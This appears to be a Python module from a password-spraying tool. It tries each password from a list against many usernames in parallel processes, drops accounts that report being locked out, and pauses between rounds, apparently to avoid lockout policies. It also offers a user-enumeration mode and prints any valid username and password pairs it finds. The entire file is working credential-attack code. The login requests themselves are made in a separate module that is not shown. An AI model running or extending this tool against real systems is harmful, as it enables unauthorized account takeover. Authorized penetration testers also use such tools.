from datetime import datetime, timedelta
from multiprocessing import Process, Queue
from . import utils
import pause

def main(args, spray_config):
    results = []
    password_id = 0

    while password_id < len(args.passwords):
        password = args.passwords[password_id]
        next_start_time = datetime.now() + timedelta(minutes=args.delay)
        if password:
            print(f"Beginning spray with password '{password}'")
        else:
            print(f"Beginning user enumeration")

        user_chunks = split_usernames(args)
        results.extend(launch_spray_processes(spray_config, user_chunks, password))
        args.usernames = remove_locked_users(args.usernames, results)

        password_id += 1
        print(f"Spray of password '{password}' complete.", end=" ")
        if password_id < len(args.passwords):
            print(f"Waiting until {next_start_time.strftime('%H:%M')} to start next spray.")
            report_valid_credentials(results)
            pause.until(next_start_time)
        else:
            print("All passwords complete.")

    return results


def remove_locked_users(usernames, results):
    locked_users = {entry["USERNAME"] for entry in results if entry["RESULT"] == "LOCKED"}

    for username in locked_users:
        if username in usernames:
            usernames.remove(username)

    return usernames


def split_usernames(args):
    chunk_size = (len(args.usernames) + args.threads - 1) // args.threads
    return [args.usernames[i:i + chunk_size] for i in range(0, len(args.usernames), chunk_size)]


def launch_spray_processes(spray_config, user_chunks, password=None):
    processes = []
    queue = Queue()

    for user_chunk in user_chunks:
        credentials = []
        for entry in user_chunk:
            if isinstance(entry, dict):
                username = entry.get("USERNAME") or entry.get("username")
                entry_password = entry.get("PASSWORD") or entry.get("password")
            else:
                username = entry
                entry_password = None

            credentials.append(
                {
                    "USERNAME": username,
                    "PASSWORD": password if password is not None else entry_password,
                }
            )
        p = Process(target=utils.perform_spray, args=(spray_config, credentials, queue))
        p.start()
        processes.append(p)

    for p in processes:
        p.join()

    return collect_results(queue)


def collect_results(queue):
    results = []
    while not queue.empty():
        results.extend(queue.get())
    return results


def report_valid_credentials(results):
    valid = [entry for entry in results if entry['RESULT'] == 'SUCCESS']
    if valid:
        print("Valid Credentials Found:")
        for entry in valid:
            print(f"{entry['USERNAME']} - {entry['PASSWORD']}")
        print()
